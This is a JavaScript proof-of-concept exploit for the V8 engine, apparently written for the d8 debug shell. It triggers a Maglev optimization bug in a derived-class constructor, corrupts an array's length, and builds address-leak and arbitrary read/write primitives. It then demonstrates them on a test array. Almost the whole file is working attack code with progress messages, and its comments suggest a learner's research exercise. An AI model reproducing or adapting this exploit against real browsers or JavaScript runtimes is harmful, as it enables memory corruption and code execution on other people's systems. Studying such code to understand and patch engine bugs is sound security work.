class Helpers {
    constructor () {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;

    }

    nop_nop() {

    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
    print_hex(f) {
        console.log('0x' + this.f64toi64(f).toString(16));
    }
    hex_to_dbl(hexString) {
        if (hexString.startsWith('0x')) {
            hexString = hexString.substring(2);
        }

        for (let i = 0; i < 8; i++) {
            const byte = hexString.substring(hexString.length - (i + 1) * 2, hexString.length - i * 2);
            this.u8[i] = parseInt(byte, 16);
        }

        const float64 = new Float64Array(this.u8.buffer);
        return float64[0];
    }
    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}
var helper = new Helpers();

var v;
var empty_object = {};
let zero = 0;
let corrupted_instance = null;

let a_addr = 0
let rwarr = null;
let rwarr_addr = 0
let rwarr_storage_idx = 0;

let changer = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]
let leaker = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]
let holder = { p1: 0x1234, p2: 0x1234, p3: 0x1234 };
let original_holder_bytes = 0;

class A { }
class B extends A {
    constructor () {
        v = new.target;
        let objArr = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
        super();
        gc();
        let floatArr = [1.1];

        this.x = objArr;
        this.a = floatArr;
    }
}

function gc() {
    for (let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function debug_print(name, obj) {
    console.log(`Debug of ${name}`);
    % DebugPrint(obj);
}

function addrOf_tmp(obj) {
    corrupted_instance.x[0] = obj;               // x holds objects that need to be leaked
    helper.f64[0] = corrupted_instance.a[0];     // set ArrayBuffer with the first element of a, which point to the object  
    return helper.u32[0];                    // get the last 32 bits of the address due to pointer compression
}

// These functions use `where-in` because v8
// needs to jump over the map and size words
function write_temp(where, what) {
    helper.f64[0] = corrupted_instance.a[rwarr_storage_idx];
    if (helper.u32[0] == 0x6) {
        helper.f64[0] = corrupted_instance.a[rwarr_storage_idx - 1];
        helper.u32[1] = where - 8; // don't know why -8
        corrupted_instance.a[rwarr_storage_idx - 1] = helper.f64[0];
    } else if (helper.u32[1] == 0x6) {
        helper.u32[0] = where - 8;
        corrupted_instance.a[rwarr_storage_idx] = helper.f64[0];
    }
    rwarr[0] = what;
}

function read(addr) {
    let original_leaker_address = changer[0];
    helper.u32[1] = 0xc; helper.u32[0] = Number(addr) - 8; // <-- QUESTION: why use 0xc?
    changer[0] = helper.f64[0];

    let ret = leaker[0]; // get data
    changer[0] = original_leaker_address;
    return helper.f64toi64(ret);
}

function write(addr, value) {
    let original_leaker_address = changer[0];
    helper.u32[1] = 0xc; helper.u32[0] = Number(addr) - 8;
    changer[0] = helper.f64[0];

    helper.f64[0] = leaker[0];          // point buffer to data
    helper.u32[0] = Number(value);      // write data
    leaker[0] = helper.f64[0];
    changer[0] = original_leaker_address;
}

function addrOf(obj) {
    holder.p2 = obj;
    let ret = leaker[1];
    holder.p2 = 0;
    return helper.f64toi64(ret) & 0xffffffffn;
}

function exploit() {
    print("[+] Triggering GC for moving GC-resistance objects into old space...");
    for (let i = 0; i < 100; i++) {
        if (i < 90) gc();
    }

    print("[+] Triggering the bug...");
    for (let i = 0; i < 100; i++) {
        if (i < 90) gc();
    }

    % PrepareFunctionForOptimization(B);
    corrupted_instance = new B();

    for (let i = 0; i < 100; i++) {
        % OptimizeMaglevOnNextCall(B);
        corrupted_instance = new B();
    }
    // debug_print('corrupted_instance.x', corrupted_instance.x);
    // debug_print('corrupted_instance.a', corrupted_instance.a);

    // let objectThatNeedToBeLeaked = { a: 1 };
    // debug_print(objectThatNeedToBeLeaked);
    // print("[+] Leaking the object address...");
    // let leakedObjectAddress = addrof_tmp(objectThatNeedToBeLeaked);
    // print("[+] Leaked object address: 0x" + leakedObjectAddress.toString(16));

    print("[+] Corrupting the metadata (length) of corrupted_instance.a ..");
    corrupted_instance.x[5] = 0x10000000; // need to be bigger for covering the whole memory
    if (corrupted_instance.a.length != 0x10000000) {
        print(`[+] Initial corruption failed! Expected: ${0x10000000}, got: ${corrupted_instance.a.length}`);
        return;
    } else {
        print(`[+] Initial corruption succeeded!`);
        // debug_print('corrupted_instance.x', corrupted_instance.x);
        // debug_print('corrupted_instance.a', corrupted_instance.a);
    }

    while (true) {
        rwarr = [1.1, 2.2, 3.3];
        rwarr_addr = addrOf_tmp(rwarr);
        a_addr = addrOf_tmp(corrupted_instance.a);

        if (rwarr_addr < a_addr) {
            // print("[+] Target array does not lie after corrupted array. Retrying...");
        } else {
            // print(`[+] Address of corrupted_instance.a: 0x${a_addr.toString(16)}`);
            // print(`[+] Address of rwArr: 0x${rwarr_addr.toString(16)}`);
            // debug_print(`corrupted_instance.a`, corrupted_instance.a);
            // debug_print(`rwarr`, rwarr);

            print("[+] Calculating the offset...");
            let offset = (rwarr_addr - a_addr) + 0xc;
            if ((offset % 8) != 0) {
                offset -= 4;
            }
            print("[+] Offset: " + offset);

            print("[+] Calculating the index...");
            rwarr_storage_idx = offset / 8;
            rwarr_storage_idx += 1;
            print("[+] Index: " + rwarr_storage_idx);

            helper.f64[0] = corrupted_instance.a[rwarr_storage_idx];
            // print("[+] The approximately view of pointer's data: 0x"
            //     + helper.u32[0].toString(16) + " 0x"
            //     + helper.u32[1].toString(16)); // value can be in u32[0] or u32[1]
            break;
        }
    }

    // print("[+] Writing data...");
    let data = 13.37;                                    // have to be float because rwarr is a float array
    let bufToBeWritten = [1.1, 2.2, 3.3, 4.4];
    let bufToBeWritten_addr = addrOf_tmp(bufToBeWritten);
    // v8h_write64(bufToBeWritten_addr - 1 + 0x10, data);   // 0x10 is offset of length
    // debug_print('bufToBeWritten', bufToBeWritten);

    print("[+] Building GC persistence primitives...");
    changer_addr = addrOf_tmp(changer);
    leaker_addr = addrOf_tmp(leaker);
    holder_addr = addrOf_tmp(holder);

    helper.u32[1] = 0xc; helper.u32[0] = holder_addr;
    let original_holder_address = helper.f64[0];

    helper.u32[1] = 0xc; helper.u32[0] = leaker_addr;
    write_temp(changer_addr + 0x8, helper.f64[0]);                //0x8 is offset of `elements` pointer
    write_temp(leaker_addr + 0x8, original_holder_address);

    // debug_print('changer', changer);
    // debug_print('leaker', leaker);
    // debug_print('holder', holder);

    print("[+] Fixing corrupted fields...");
    corrupted_instance.x.length = 0;
    corrupted_instance.a.length = 0;
    rwarr.length = 0;

    print("[+] Using new primitives to read address...")
    bufToBeWritten_addr = addrOf(bufToBeWritten);
    print("[+] The address of bufToBeWritten: 0x" + bufToBeWritten_addr.toString(16));
    debug_print('bufToBeWritten', bufToBeWritten);

    print("[+] Using new primitives to read data...");
    read(bufToBeWritten_addr + 0x8n); // read elements (and also length)
    print("[+] The original data: 0x" + helper.u32[0].toString(16));
    debug_print('bufToBeWritten', bufToBeWritten);

    print("[+] Using new primitives to write data...");
    write(bufToBeWritten_addr - 1n + 0x10n, data); // write length
    debug_print('bufToBeWritten', bufToBeWritten);
}

exploit();
